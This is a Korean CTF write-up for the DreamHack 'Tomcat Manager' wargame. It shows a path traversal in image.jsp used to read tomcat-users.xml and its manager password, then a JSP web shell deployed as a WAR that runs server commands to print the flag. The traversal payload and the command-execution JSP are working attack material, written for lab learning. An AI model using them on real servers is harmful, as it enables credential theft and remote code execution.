# [DreamHack] Tomcat Manager

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> 드림이가 톰캣 서버로 개발을 시작하였습니다.
> 서비스의 취약점을 찾아 플래그를 획득하세요.
> 플래그는 `/flag` 경로에 있습니다.
>
> Release: [Tomcat Manager.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8567082/Tomcat.Manager.zip)

## Analysis

### index.jsp

```jsp
<html>
<body>
    <center>
        <h2>Under Construction</h2>
        <p>Coming Soon...</p>
        <img src="./image.jsp?file=working.png"/>
    </center>
</body>
</html>
```

홈 페이지(`index.jsp`)에 접속하면 Under Construction, Coming Soon이라는 메시지가 뜨고, `./image.jsp?file=working.png`에 요청을 보내서 이미지를 불러온다.

![image](https://user-images.githubusercontent.com/104156058/165413680-7aa21275-1b7e-4b8d-a4cc-fc26442b202b.png)

### image.jsp

```jsp
<%@ page trimDirectiveWhitespaces="true" %>
<%
String filepath = getServletContext().getRealPath("resources") + "/";
String _file = request.getParameter("file");

response.setContentType("image/jpeg");
try{
    java.io.FileInputStream fileInputStream = new java.io.FileInputStream(filepath + _file);
    int i;   
    while ((i = fileInputStream.read()) != -1) {  
        out.write(i);
    }   
    fileInputStream.close();
}catch(Exception e){
    response.sendError(404, "Not Found !" );
}
%>
```

`image.jsp`는 서버에 있는 파일의 내용을 읽어서 이미지로 반환한다. 파일 이름은 `request.getParameter("file")`로 가져오는데, 아무런 필터링이 없어서 path traversal 취약점이 발생한다.

## Exploit

### Get manager passwod

문제에서 주어진 `tomcat-users.xml` 파일을 보면, manager 기능이 활성화되어 있지만 권한이 있는 유저인 `tomcat`의 패스워드는 지워져 있다. `Dockerfile`을 보면 `tomcat-users.xml` 의 full path가 `/usr/local/tomcat/conf/tomcat-users.xml`인 것을 알 수 있다. `image.jsp`에서 발생하는 path traversal 취약점을 이용해서 이 파일의 내용을 읽어올 수 있다.

`/image.jsp?file=../../../../../../../../usr/local/tomcat/conf/tomcat-users.xml`로 접속하면 다음의 응답을 받을 수 있다.

```
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Content-Type: image/jpeg;charset=ISO-8859-1
Content-Length: 659
Date: Wed, 27 Apr 2022 00:16:52 GMT
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">

    <role rolename="manager-gui"/>
    <role rolename="manager-script"/>
    <role rolename="manager-jmx"/>
    <role rolename="manager-status"/>
    <role rolename="admin-gui"/>
    <role rolename="admin-script"/>
    <user username="tomcat" password="P2assw0rd_4_t0mC2tM2nag3r31337" roles="manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script" />  
</tomcat-users>
```

`tomcat`의 패스워드는 `P2assw0rd_4_t0mC2tM2nag3r31337`이다.

### Deploy web shell

Tomcat manager의 deploy 기능을 이용하면 임의의 `jsp` 코드가 서버에서 실행되도록 할 수 있다.

```jsp
<%@ page language="java" import= "java.io.*, java.util.*, java.net.* " contentType="text/html;charset=EUC-KR" session="false" %>

<%
    String bashCommand[] = {"ls", "-al", "/"};

    int lineCount = 0;
    String line = "";

    ProcessBuilder builder = new ProcessBuilder(bashCommand);
    Process childProcess = null;

    childProcess = builder.start();
    
    BufferedReader br = new BufferedReader(new InputStreamReader(new SequenceInputStream(childProcess.getInputStream(), childProcess.getErrorStream())));
    
    while ((line = br.readLine()) != null) {
%>
<%=line%><br>
<%
    }

    br.close();
%>
```

위의 `jsp` 코드는 서버에서 `bashCommand`를 실행한 결과를 출력하는 코드이다. [https://wnsgml972.github.io/linux/2018/08/03/linux_shellscript/](https://wnsgml972.github.io/linux/2018/08/03/linux_shellscript/)의 코드를 참고해서 작성하였다. 이 코드를 `FLAG.war`라는 이름의 파일로 압축하여 deploy한다.

![image](https://user-images.githubusercontent.com/104156058/165421313-e2c4895d-2f07-4c4a-b3e7-f0ff09c7da04.png)

![image](https://user-images.githubusercontent.com/104156058/165421387-1153c272-f31f-425f-afe8-64472db98003.png)

그리고 나서 `/FLAG`로 접속해보면

![image](https://user-images.githubusercontent.com/104156058/165421434-ab7aff0b-84c4-4955-90e8-ce7d69a70658.png)

서버의 `/` 디렉토리의 파일 목록을 확인할 수 있다. `flag` 파일이 있는데, 읽기 권한은 없고 실행 권한만 있다. 그냥 path traversal 취약점으로 플래그 파일의 내용을 읽어오는 것을 막기 위한 것 같다.

위의 `jsp` 파일에서 `String bashCommand[] = {"ls", "-al", "/"};`를 `String bashCommand[] = {"/flag"};`로 수정하여 다시 deploy한 후, `/FLAG`에 접속해보면

![image](https://user-images.githubusercontent.com/104156058/165421656-cd67bf84-3796-49cd-a3e6-d49cf5294584.png)

플래그를 획득할 수 있다.

```
flag: DH{a2062e589d0b1d627cf999066fb6c335ffe89ab85e81d7b7d91dd64e8f59d505}
```